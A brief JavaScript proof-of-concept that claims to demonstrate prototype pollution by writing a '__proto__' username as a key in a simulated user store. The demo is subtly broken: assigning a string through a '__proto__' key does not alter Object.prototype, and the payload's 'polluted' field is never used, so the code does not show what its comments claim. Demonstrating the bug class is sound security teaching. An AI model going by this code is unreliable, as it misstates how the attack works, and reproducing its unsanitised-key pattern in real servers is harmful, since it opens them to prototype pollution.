
// This is a simple proof-of-concept to demonstrate prototype pollution.
// It is not a full-fledged exploit.

// Create a malicious payload
const maliciousPayload = {
    "username": "__proto__",
    "polluted": "true"
};

// Check if the Object.prototype has been polluted
const object = {};
if (object.polluted) {
    console.log("Before the exploit, the Object.prototype is already polluted.");
} else {
    console.log("Before the exploit, the Object.prototype is not polluted.");
}

// Simulate the server-side behavior
const db = {
    data: {
        users: {}
    }
};

const username = maliciousPayload.username;
db.data.users[username] = "polluted";

// Check if the Object.prototype has been polluted after the exploit
if (object.polluted) {
    console.log("After the exploit, the Object.prototype is polluted.");
} else {
    console.log("After the exploit, the Object.prototype is not polluted.");
}
